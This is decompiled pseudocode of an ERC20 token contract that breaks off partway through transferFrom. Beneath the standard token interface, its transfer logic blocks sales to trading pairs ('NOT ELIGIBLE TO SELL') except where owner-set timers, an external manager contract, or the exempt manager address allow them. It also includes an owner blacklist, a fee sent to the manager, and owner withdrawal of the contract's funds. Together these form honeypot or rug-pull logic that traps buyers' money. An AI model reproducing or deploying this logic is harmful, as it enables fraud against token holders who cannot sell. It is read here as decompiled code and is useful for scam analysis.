contract main {




// =====================  Runtime code  =====================


const decimals = 18


mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of struct stor3;
array of struct stor4;
address owner;
mapping of uint8 stor8;
mapping of uint8 stor9;
mapping of uint256 sub_944482af;
uint256 sub_94c756a4;
uint256 sub_a6697d53;
uint8 stor13;
uint256 sub_ee76f759;
uint256 sub_76718ac5;
address sub_9bb5cd3fAddress;
uint256 sub_fd80fb60;
uint256 _totalSupply;
uint8 _decimals;

function totalSupply() payable {
    return totalSupply
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function sub_57c18816(?) payable {
    return bool(stor13)
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function sub_76718ac5(?) payable {
    return sub_76718ac5
}

function owner() payable {
    return owner
}

function sub_944482af(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return sub_944482af[address(arg1)]
}

function sub_94c756a4(?) payable {
    return sub_94c756a4
}

function sub_9bb5cd3f(?) payable {
    return sub_9bb5cd3fAddress
}

function sub_9c02514a(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor9[address(arg1)])
}

function sub_a6697d53(?) payable {
    return sub_a6697d53
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function isPair(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor8[address(arg1)])
}

function sub_ee76f759(?) payable {
    return sub_ee76f759
}

function sub_fd80fb60(?) payable {
    return sub_fd80fb60
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = 0
    emit OwnershipTransferred(owner, 0);
}

function sub_13d31b51(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_a6697d53 = arg1
}

function sub_9b5c11e3(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_fd80fb60 = arg1
}

function sub_af77f2a8(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_94c756a4 = arg1
}

function sub_2f99e658(?) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_ee76f759 = arg1
    sub_76718ac5 = arg2
}

function sub_f8bb4399(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor13 = uint8(bool(arg1))
}

function updateManager(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_9bb5cd3fAddress = arg1
}

function sub_b9b79aee(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_944482af[address(arg1)] = arg2
}

function sub_6736897e(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == bool(arg2)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor9[address(arg1)] = uint8(bool(arg2))
}

function sub_76c73064(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == bool(arg2)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor8[address(arg1)] = uint8(bool(arg2))
}

function sub_a44f9b5e(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    if block.timestamp < sub_944482af[address(arg1)]:
        revert with 0, 17
    if block.timestamp - sub_944482af[address(arg1)] and arg2 > -1 / block.timestamp - sub_944482af[address(arg1)]:
        revert with 0, 17
    return ((block.timestamp * arg2) - (sub_944482af[address(arg1)] * arg2))
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Ownable: new owner is the zero address'
    owner = arg1
    emit OwnershipTransferred(owner, arg1);
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function WithdrawStuckBalance(uint256 arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if eth.balance(this.address) and arg1 > -1 / eth.balance(this.address):
        revert with 0, 17
    call arg2 with:
       value eth.balance(this.address) * arg1 / 100 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] > !arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
    emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] < arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: decreased allowance below zero'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function WithdrawStuckERC20Token(uint256 arg1, address arg2, address arg3) payable {
    require calldata.size - 4 >= 96
    require arg2 == arg2
    require arg3 == arg3
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(arg2)
    staticcall arg2.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] and arg1 > -1 / ext_call.return_data[0]:
        revert with 0, 17
    require ext_code.size(arg2)
    call arg2.0xa9059cbb with:
         gas gas_remaining wei
        args address(arg3), ext_call.return_data[0] * arg1 / 100
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function name() payable {
    if bool(stor3.length):
        if bool(stor3.length) == uint255(stor3.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor3.length):
            if bool(stor3.length) == uint255(stor3.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor3.length):
                if 31 < uint255(stor3.length) * 0.5:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor3.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length), data=mem[128 len ceil32(uint255(stor3.length) * 0.5)])
                mem[128] = 256 * stor3.length.field_8
        else:
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 0, 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length), data=mem[128 len ceil32(uint255(stor3.length) * 0.5)])
                mem[128] = 256 * stor3.length.field_8
        mem[ceil32(uint255(stor3.length) * 0.5) + 192 len ceil32(uint255(stor3.length) * 0.5)] = mem[128 len ceil32(uint255(stor3.length) * 0.5)]
        if ceil32(uint255(stor3.length) * 0.5) > uint255(stor3.length) * 0.5:
            mem[ceil32(uint255(stor3.length) * 0.5) + (uint255(stor3.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor3.length), data=mem[128 len ceil32(uint255(stor3.length) * 0.5)], mem[(2 * ceil32(uint255(stor3.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor3.length) * 0.5)]), 
    if bool(stor3.length) == stor3.length.field_1 < 32:
        revert with 0, 34
    if bool(stor3.length):
        if bool(stor3.length) == uint255(stor3.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor3.length):
            if 31 < uint255(stor3.length) * 0.5:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while (uint255(stor3.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    else:
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 0, 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
    if ceil32(stor3.length.field_1) > stor3.length.field_1:
        mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
    return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
}

function symbol() payable {
    if bool(stor4.length):
        if bool(stor4.length) == uint255(stor4.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor4.length):
            if bool(stor4.length) == uint255(stor4.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor4.length):
                if 31 < uint255(stor4.length) * 0.5:
                    mem[128] = uint256(stor4.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor4.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor4[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor4.length), data=mem[128 len ceil32(uint255(stor4.length) * 0.5)])
                mem[128] = 256 * stor4.length.field_8
        else:
            if bool(stor4.length) == stor4.length.field_1 < 32:
                revert with 0, 34
            if stor4.length.field_1:
                if 31 < stor4.length.field_1:
                    mem[128] = uint256(stor4.field_0)
                    idx = 128
                    s = 0
                    while stor4.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor4[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor4.length), data=mem[128 len ceil32(uint255(stor4.length) * 0.5)])
                mem[128] = 256 * stor4.length.field_8
        mem[ceil32(uint255(stor4.length) * 0.5) + 192 len ceil32(uint255(stor4.length) * 0.5)] = mem[128 len ceil32(uint255(stor4.length) * 0.5)]
        if ceil32(uint255(stor4.length) * 0.5) > uint255(stor4.length) * 0.5:
            mem[ceil32(uint255(stor4.length) * 0.5) + (uint255(stor4.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor4.length), data=mem[128 len ceil32(uint255(stor4.length) * 0.5)], mem[(2 * ceil32(uint255(stor4.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor4.length) * 0.5)]), 
    if bool(stor4.length) == stor4.length.field_1 < 32:
        revert with 0, 34
    if bool(stor4.length):
        if bool(stor4.length) == uint255(stor4.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor4.length):
            if 31 < uint255(stor4.length) * 0.5:
                mem[128] = uint256(stor4.field_0)
                idx = 128
                s = 0
                while (uint255(stor4.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor4[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
            mem[128] = 256 * stor4.length.field_8
    else:
        if bool(stor4.length) == stor4.length.field_1 < 32:
            revert with 0, 34
        if stor4.length.field_1:
            if 31 < stor4.length.field_1:
                mem[128] = uint256(stor4.field_0)
                idx = 128
                s = 0
                while stor4.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor4[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)])
            mem[128] = 256 * stor4.length.field_8
    mem[ceil32(stor4.length.field_1) + 192 len ceil32(stor4.length.field_1)] = mem[128 len ceil32(stor4.length.field_1)]
    if ceil32(stor4.length.field_1) > stor4.length.field_1:
        mem[ceil32(stor4.length.field_1) + stor4.length.field_1 + 192] = 0
    return Array(len=stor4.length % 128, data=mem[128 len ceil32(stor4.length.field_1)], mem[(2 * ceil32(stor4.length.field_1)) + 192 len 2 * ceil32(stor4.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'TRANSFER: transfer from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'TRANSFER: transfer to the zero address'
    if stor9[address(msg.sender)]:
        revert with 0, 'Sender is malicious address'
    if not stor8[address(arg1)]:
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
        if balanceOf[address(msg.sender)] < arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[arg1] > !arg2:
            revert with 0, 17
        balanceOf[arg1] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if sub_9bb5cd3fAddress == msg.sender:
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            if balanceOf[address(msg.sender)] < arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[arg1] > !arg2:
                revert with 0, 17
            balanceOf[arg1] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if not stor13:
                if not sub_944482af[address(msg.sender)]:
                    if arg2 > sub_a6697d53:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                if sub_94c756a4:
                    if block.timestamp < sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(msg.sender)] and sub_94c756a4 > -1 / block.timestamp - sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if (block.timestamp * sub_94c756a4) - (sub_944482af[address(msg.sender)] * sub_94c756a4) < arg2:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                    sub_944482af[address(msg.sender)] = block.timestamp
                    if not sub_fd80fb60:
                        if not msg.sender:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                        if not arg1:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if sub_fd80fb60 > 100:
                            if not msg.sender:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_fd80fb60 > -1 / arg2:
                                revert with 0, 17
                            if not msg.sender:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not sub_9bb5cd3fAddress:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2 * sub_fd80fb60 / 100:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] -= arg2 * sub_fd80fb60 / 100
                            if balanceOf[stor16] > !(arg2 * sub_fd80fb60 / 100):
                                revert with 0, 17
                            balanceOf[stor16] += arg2 * sub_fd80fb60 / 100
                            emit Transfer((arg2 * sub_fd80fb60 / 100), msg.sender, sub_9bb5cd3fAddress);
                            if arg2 < arg2 * sub_fd80fb60 / 100:
                                revert with 0, 17
                            if not msg.sender:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_fd80fb60 / 100):
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_fd80fb60 / 100)
                            if balanceOf[arg1] > !(arg2 - (arg2 * sub_fd80fb60 / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * sub_fd80fb60 / 100)
                            emit Transfer((arg2 - (arg2 * sub_fd80fb60 / 100)), msg.sender, arg1);
                else:
                    require ext_code.size(sub_9bb5cd3fAddress)
                    staticcall sub_9bb5cd3fAddress.0x4305235d with:
                            gas gas_remaining wei
                           args msg.sender
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    if ext_call.return_data[0] and sub_ee76f759 > -1 / ext_call.return_data[0]:
                        revert with 0, 17
                    if not sub_76718ac5:
                        revert with 0, 18
                    if block.timestamp < sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(msg.sender)] and ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5 > -1 / block.timestamp - sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if (block.timestamp * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) - (sub_944482af[address(msg.sender)] * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) < arg2:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                    sub_944482af[address(msg.sender)] = block.timestamp
                    if not sub_fd80fb60:
                        if not msg.sender:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not arg1:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if sub_fd80fb60 > 100:
                            if not msg.sender:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not arg1:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if arg2 and sub_fd80fb60 > -1 / arg2:
                                revert with 0, 17
                            if not msg.sender:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not sub_9bb5cd3fAddress:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2 * sub_fd80fb60 / 100:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] -= arg2 * sub_fd80fb60 / 100
                            if balanceOf[stor16] > !(arg2 * sub_fd80fb60 / 100):
                                revert with 0, 17
                            balanceOf[stor16] += arg2 * sub_fd80fb60 / 100
                            emit Transfer((arg2 * sub_fd80fb60 / 100), msg.sender, sub_9bb5cd3fAddress);
                            if arg2 < arg2 * sub_fd80fb60 / 100:
                                revert with 0, 17
                            if not msg.sender:
                                revert with 0, 'ERC20: transfer from the zero address'
                            if not arg1:
                                revert with 0, 'ERC20: transfer to the zero address'
                            if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_fd80fb60 / 100):
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_fd80fb60 / 100)
                            if balanceOf[arg1] > !(arg2 - (arg2 * sub_fd80fb60 / 100)):
                                revert with 0, 17
                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * sub_fd80fb60 / 100)
                            emit Transfer((arg2 - (arg2 * sub_fd80fb60 / 100)), msg.sender, arg1);
            else:
                require ext_code.size(sub_9bb5cd3fAddress)
                staticcall sub_9bb5cd3fAddress.0x4305235d with:
                        gas gas_remaining wei
                       args msg.sender
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                if not ext_call.return_data[0]:
                    revert with 0, 'NOT ELIGIBLE TO SELL'
                if not sub_944482af[address(msg.sender)]:
                    if arg2 > sub_a6697d53:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                if sub_94c756a4:
                    if block.timestamp < sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(msg.sender)] and sub_94c756a4 > -1 / block.timestamp - sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if (block.timestamp * sub_94c756a4) - (sub_944482af[address(msg.sender)] * sub_94c756a4) < arg2:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                else:
                    require ext_code.size(sub_9bb5cd3fAddress)
                    staticcall sub_9bb5cd3fAddress.0x4305235d with:
                            gas gas_remaining wei
                           args msg.sender
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    if ext_call.return_data[0] and sub_ee76f759 > -1 / ext_call.return_data[0]:
                        revert with 0, 17
                    if not sub_76718ac5:
                        revert with 0, 18
                    if block.timestamp < sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(msg.sender)] and ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5 > -1 / block.timestamp - sub_944482af[address(msg.sender)]:
                        revert with 0, 17
                    if (block.timestamp * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) - (sub_944482af[address(msg.sender)] * ext_call.return_data[0] * sub_ee76f759 / sub_76718ac5) < arg2:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                sub_944482af[address(msg.sender)] = block.timestamp
                if not sub_fd80fb60:
                    if not msg.sender:
                        revert with 0, 'ERC20: transfer from the zero address'
                    if not arg1:
                        revert with 0, 'ERC20: transfer to the zero address'
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0, 'ERC20: transfer amount exceeds balance'
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[arg1] > !arg2:
                        revert with 0, 17
                    balanceOf[arg1] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if sub_fd80fb60 > 100:
                        if not msg.sender:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not arg1:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg2 and sub_fd80fb60 > -1 / arg2:
                            revert with 0, 17
                        if not msg.sender:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not sub_9bb5cd3fAddress:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(msg.sender)] < arg2 * sub_fd80fb60 / 100:
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(msg.sender)] -= arg2 * sub_fd80fb60 / 100
                        if balanceOf[stor16] > !(arg2 * sub_fd80fb60 / 100):
                            revert with 0, 17
                        balanceOf[stor16] += arg2 * sub_fd80fb60 / 100
                        emit Transfer((arg2 * sub_fd80fb60 / 100), msg.sender, sub_9bb5cd3fAddress);
                        if arg2 < arg2 * sub_fd80fb60 / 100:
                            revert with 0, 17
                        if not msg.sender:
                            revert with 0, 'ERC20: transfer from the zero address'
                        if not arg1:
                            revert with 0, 'ERC20: transfer to the zero address'
                        if balanceOf[address(msg.sender)] < arg2 - (arg2 * sub_fd80fb60 / 100):
                            revert with 0, 'ERC20: transfer amount exceeds balance'
                        balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_fd80fb60 / 100)
                        if balanceOf[arg1] > !(arg2 - (arg2 * sub_fd80fb60 / 100)):
                            revert with 0, 17
                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * sub_fd80fb60 / 100)
                        emit Transfer((arg2 - (arg2 * sub_fd80fb60 / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'TRANSFER: transfer from the zero address'
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'TRANSFER: transfer to the zero address'
    if stor9[address(arg1)]:
        revert with 0, 'Sender is malicious address'
    if not stor8[address(arg2)]:
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
        if balanceOf[address(arg1)] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
        balanceOf[address(arg1)] -= arg3
        if balanceOf[arg2] > !arg3:
            revert with 0, 17
        balanceOf[arg2] += arg3
        emit Transfer(arg3, arg1, arg2);
        if allowance[address(arg1)][msg.sender] < arg3:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    else:
        if sub_9bb5cd3fAddress == arg1:
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
            if balanceOf[address(arg1)] < arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds balance'
            balanceOf[address(arg1)] -= arg3
            if balanceOf[arg2] > !arg3:
                revert with 0, 17
            balanceOf[arg2] += arg3
            emit Transfer(arg3, arg1, arg2);
            if allowance[address(arg1)][msg.sender] < arg3:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
        else:
            if not stor13:
                if not sub_944482af[address(arg1)]:
                    if arg3 > sub_a6697d53:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
                if sub_94c756a4:
                    if block.timestamp < sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if block.timestamp - sub_944482af[address(arg1)] and sub_94c756a4 > -1 / block.timestamp - sub_944482af[address(arg1)]:
                        revert with 0, 17
                    if (block.timestamp * sub_94c756a4) - (sub_944482af[address(arg1)] * sub_94c756a4) < arg3:
                        revert with 0, 'NOT ELIGIBLE TO SELL'
